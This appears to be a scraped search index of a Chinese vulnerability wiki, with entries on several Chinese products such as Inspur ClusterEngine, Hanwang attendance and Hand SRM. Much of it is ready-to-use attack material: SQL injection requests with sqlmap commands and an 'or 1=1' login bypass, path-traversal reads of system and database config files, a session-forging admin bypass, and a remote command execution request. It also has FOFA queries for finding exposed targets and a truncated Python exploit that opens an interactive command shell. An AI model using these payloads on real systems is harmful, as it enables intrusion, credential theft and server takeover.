","date":"0001-01-01","objectID":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 杭州法源软件 公证实务教学软件 ","date":"0001-01-01","objectID":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 FOFA暂时未收录任何网站 ","date":"0001-01-01","objectID":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 登录抓取请求包 POST /JusNotary/ HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 219 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: ASP.NET_SessionId=54zwf05sd1g4zyfpiuxxdmuc x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close __EVENTTARGET=\u0026__EVENTARGUMENT=\u0026__VIEWSTATE=%2FwEPDwUKMTE5NTI5NDc1Ng8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBZGTTkYMK0k4DlIElq0ua0zvxEhpFH8rCzVrUscEhlVc9pw%3D%3D\u0026__VIEWSTATEGENERATOR=1B0004A3\u0026txtName=123\u0026txtPwd=123\u0026btnSubmit=+ 其中注入的参数为 POST数据中的 txtName 参数, 保存为文件使用 Sqlmap跑一下 ","date":"0001-01-01","objectID":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E5%85%AC%E8%AF%81%E5%AE%9E%E5%8A%A1%E6%95%99%E5%AD%A6%E8%BD%AF%E4%BB%B6-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"杭州法源软件 法律知识数据库系统 后台XSS漏洞 ","date":"0001-01-01","objectID":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 杭州法源软件开发有限公司开发的实践教学平台系统下的法律知识数据库系统登录后台用户名处存在通用XSS漏洞 ","date":"0001-01-01","objectID":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 杭州法源软件 法律知识数据库系统 ","date":"0001-01-01","objectID":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"2018105215\" || title=\"实践教学平台 - 杭州法源软件开发有限公司\" ","date":"0001-01-01","objectID":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录后台后更改用户名，使用 td标签 闭合 ","date":"0001-01-01","objectID":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%9D%AD%E5%B7%9E%E6%B3%95%E6%BA%90%E8%BD%AF%E4%BB%B6-%E6%B3%95%E5%BE%8B%E7%9F%A5%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"极通EWEBS casmain.xgi 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%80%9Aewebs-casmain.xgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%80%9Aewebs-casmain.xgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 极通EWEBS casmain.xgi 任意文件读取漏洞，攻击者通过漏洞可以读取任意文件 ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%80%9Aewebs-casmain.xgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%80%9Aewebs-casmain.xgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 极通EWEBS ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%80%9Aewebs-casmain.xgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%80%9Aewebs-casmain.xgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"新软科技-极通EWEBS\" ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%80%9Aewebs-casmain.xgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%80%9Aewebs-casmain.xgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞请求包为 POST /casmain.xgi HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=923b86fa90ce1e14c82d4e36d1adc528; CookieLanguageName=ZH-CN Content-Length: 57 Language_S=../../../../windows/system32/drivers/etc/hosts 可以配合 testweb.php 信息泄露读取敏感信息 Language_S=../../Data/CONFIG/CasDbCnn.dat ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%80%9Aewebs-casmain.xgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%80%9Aewebs-casmain.xgi-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"极通EWEBS testweb.php 敏感信息泄露漏洞 ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%80%9Aewebs-testweb.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%80%9Aewebs-testweb.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 极通EWEBS testweb.php 存在敏感信息泄露，其中含有配置文件信息以及phpinfo信息 ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%80%9Aewebs-testweb.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%80%9Aewebs-testweb.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 极通EWEBS ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%80%9Aewebs-testweb.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%80%9Aewebs-testweb.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"新软科技-极通EWEBS\" ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%80%9Aewebs-testweb.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%80%9Aewebs-testweb.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 访问 testweb.php ","date":"0001-01-01","objectID":"/%E6%9E%81%E9%80%9Aewebs-testweb.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%9E%81%E9%80%9Aewebs-testweb.php-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"汇文 图书馆书目检索系统 config.properties 信息泄漏漏洞 ","date":"0001-01-01","objectID":"/%E6%B1%87%E6%96%87-%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B1%87%E6%96%87-%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 汇文 图书馆书目检索系统 /include/config.properties 文件中包含敏感信息，攻击者可以直接访问获取信息 ","date":"0001-01-01","objectID":"/%E6%B1%87%E6%96%87-%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B1%87%E6%96%87-%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 汇文v5.6 ","date":"0001-01-01","objectID":"/%E6%B1%87%E6%96%87-%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B1%87%E6%96%87-%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"汇文软件-书目检索系统\" ","date":"0001-01-01","objectID":"/%E6%B1%87%E6%96%87-%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B1%87%E6%96%87-%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /include/config.properties ","date":"0001-01-01","objectID":"/%E6%B1%87%E6%96%87-%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B1%87%E6%96%87-%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F-config.properties-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"汉得SRM tomcat.jsp 登陆绕过漏洞 ","date":"0001-01-01","objectID":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 汉得SRM tomcat.jsp 文件存在登陆绕过漏洞, 攻击者通过发送请求包，可以获取后台管理员权限 ","date":"0001-01-01","objectID":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 汉得SRM ","date":"0001-01-01","objectID":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 web.body=\"汉得SRM\" ","date":"0001-01-01","objectID":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC (Tomcat session操控) /tomcat.jsp?dataName=role_id\u0026dataValue=1 /tomcat.jsp?dataName=user_id\u0026dataValue=1 访问跳转后台 /main.screen ","date":"0001-01-01","objectID":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B1%89%E5%BE%97srm-tomcat.jsp-%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"汉王人脸考勤管理系统 Check SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E6%B1%89%E7%8E%8B%E4%BA%BA%E8%84%B8%E8%80%83%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-check-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B1%89%E7%8E%8B%E4%BA%BA%E8%84%B8%E8%80%83%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-check-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 汉王人脸考勤管理系统存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。 ","date":"0001-01-01","objectID":"/%E6%B1%89%E7%8E%8B%E4%BA%BA%E8%84%B8%E8%80%83%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-check-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B1%89%E7%8E%8B%E4%BA%BA%E8%84%B8%E8%80%83%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-check-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 汉王人脸考勤管理系统 ","date":"0001-01-01","objectID":"/%E6%B1%89%E7%8E%8B%E4%BA%BA%E8%84%B8%E8%80%83%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-check-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B1%89%E7%8E%8B%E4%BA%BA%E8%84%B8%E8%80%83%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-check-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"\"汉王人脸考勤管理系统\"\" ","date":"0001-01-01","objectID":"/%E6%B1%89%E7%8E%8B%E4%BA%BA%E8%84%B8%E8%80%83%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-check-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B1%89%E7%8E%8B%E4%BA%BA%E8%84%B8%E8%80%83%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-check-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录界面如下 请求包如下 POST /Login/Check HTTP/1.1 Host: x.x.x.x Content-Length: 27 Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Origin: http://x.x.x.x:8088 Referer: http://x.x.x.x:8088/Login/Index Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ASP.NET_SessionId=otvxgfy0csmrw4i5y5t24oo1 Connection: close strName=admin\u0026strPwd=123456 其中strName参数存在注入 sqlmap -r postwang.txt -p strName --current-user user: admin' or 1=1-- pass: admin 万能密码绕过登录 ","date":"0001-01-01","objectID":"/%E6%B1%89%E7%8E%8B%E4%BA%BA%E8%84%B8%E8%80%83%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-check-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B1%89%E7%8E%8B%E4%BA%BA%E8%84%B8%E8%80%83%E5%8B%A4%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-check-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"浪潮ClusterEngineV4.0 sysShell 任意命令执行漏洞 ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 浪潮ClusterEngineV4.0 存在远程命令执行，攻击者通过发送特殊的请求可以获取服务器权限 ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 浪潮ClusterEngineV4.0 ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"TSCEV4.0\" ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 发送请求包 POST /sysShell HTTP/1.1 Host: xxx.xxx.xxx.xxx Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Cookie: lang=cn Cache-Control: max-age=0 Content-Length: 42 op=doPlease\u0026node=cu01\u0026command=cat /etc/passwd ✅注意参数 node 中的 cu01 需要为shell集群中的存在主机 这里可以配合任意用户登录漏洞查看主机名 ","date":"0001-01-01","objectID":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B5%AA%E6%BD%AEclusterenginev4.0-sysshell-%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC 如过出现 Name or service not 请通过上述的方法查看 shell集群主机的名称（脚本默认 cu01） import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: SonicWall SSL-VPN \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e whoami \\033[0m') print('+------------------------------------------') def POC_1(target_url, cmd): vuln_url = target_url + \"/sysShell\" headers = { \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Cookie\": \"lang=cn\" } data = \"op=doPlease\u0026node=cu01\u0026command=cat /etc/passwd\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data,verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/sysShell \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功执行 cat /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: cmd = input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_2(target_url, cmd) else: print(\"\\033[31m[x] 请求失败 